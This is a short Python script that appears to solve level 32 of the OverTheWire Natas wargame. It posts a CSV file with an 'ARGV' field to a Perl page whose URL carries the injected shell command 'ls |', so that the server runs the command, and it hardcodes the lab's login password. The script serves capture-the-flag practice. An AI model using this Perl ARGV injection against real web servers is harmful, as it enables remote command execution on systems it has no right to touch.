import requests
from requests.auth import HTTPBasicAuth
url = 'http://natas32.natas.labs.overthewire.org/index.pl?ls%20|'
ps32 = 'NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B'
user = 'natas32'
basicAuth=HTTPBasicAuth(user,ps32)
files = {
    'file': ('natas31.csv', open('natas31.csv', 'rb'))
}
data ={
    'file': 'ARGV'
}
response = requests.post(url, auth=basicAuth, files=files,data=data)
print(response.text)
